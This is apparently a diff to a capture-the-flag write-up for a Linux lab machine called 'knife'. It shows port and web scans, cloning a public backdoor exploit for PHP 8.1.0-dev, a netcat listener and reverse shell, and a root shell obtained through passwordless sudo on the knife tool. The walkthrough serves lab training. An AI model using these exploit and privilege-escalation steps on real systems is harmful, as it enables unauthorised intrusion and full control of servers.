@@ -2,8 +2,9 @@
 IP address : 10.10.10.242\
 Operating system : Linux
 
-## Enumeration
-Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
+## Discovery
+### Nmap
+Lets start with running a network scan on the IP address using Nmap to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -11,13 +12,13 @@ Lets start with running a network scan on the IP address using ```NMAP``` to ide
 ```code 
 sudo nmap -sC -sV -A -p- -T4 10.10.10.242 -vv
 ```
-From the output of ```nmap```, we are able to know the following informtion about the ports:
+From the output of Nmap, we are able to know the following informtion about the ports:
 | Port Number | Service | Version |
 |-----|------------------|----------------------|
 | 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
 | 80	| HTTP | Apache httpd 2.4.41 (Ubuntu) |
 
-## Discovery
+### Nikto
 Visting the website does not yield any promising results as there are only 2 urls that can be found --> ```http://10.10.10.242``` and ```http://10.10.10.242/robots.txt```\
 Next, we will scan the website with ```Nikto``` to uncover potential vulnerabilities in the website and the web server used. The following interesting information were uncovered:
 ```code
@@ -25,7 +26,8 @@ Next, we will scan the website with ```Nikto``` to uncover potential vulnerabili
 + Retrieved x-powered-by header: PHP/8.1.0-dev
 ```
 
-## Exploitation
+## Exploit
+### CVE-2020-1927
 CVE 2020-1927 was found to be related to ```Apache/2.4.41```, but it was found not to be exploitable on the website.\
 However, we were able to find a POC [here](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) for ```PHP/8.1.0-dev```
 ```code
@@ -33,6 +35,8 @@ git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
 mv backdoor_php_8.1.0-dev.py exploit_rce.py 
 mv revshell_php_8.1.0-dev.py exploit_revshell.py 
 ```
+
+### Obtaining reverse shell
 Now, we have to set up a listener on the attacker's machine
 ```code
 nc -nlvp 3000
@@ -51,6 +55,13 @@ bash: cannot set terminal process group (1036): Inappropriate ioctl for device
 bash: no job control in this shell
 james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+james@knife:/$ 
+```
+
+### Obtaining user flag
+
+Now, all we have to do is to navigate to ```/home/james``` to obtain the user flag.
+```
 james@knife:/$ cd home
 cd home
 james@knife:/home$ ls
@@ -64,7 +75,9 @@ user.txt
 james@knife:~$ cat user.txt
 cat user.txt
 ```
-However, we have not discovered the system flag yet! However, we noticed something interesting when we run ```sudo -l```. The command ```/usr/bin/kniife``` allows any user to execute with root privileges, without the need for any password.
+
+### Spawning a root shell
+However, we have not discovered the root flag yet! However, we noticed something interesting when we run ```sudo -l```. The command ```/usr/bin/kniife``` allows any user to execute with root privileges, without the need for any password.
 ```code
 james@knife:~$ sudo -l
 sudo -l
@@ -85,6 +98,13 @@ james@knife:~$ sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
 sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
 # python3 -c 'import pty; pty.spawn("/bin/bash")'   
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@knife:/home/james#
+```
+
+### Obtaining a root flag
+
+All that we have to do is to navigate to ```/root``` to obtain the root flag.
+```
 root@knife:/home/james# cd /root
 cd /root
 root@knife:~# ls
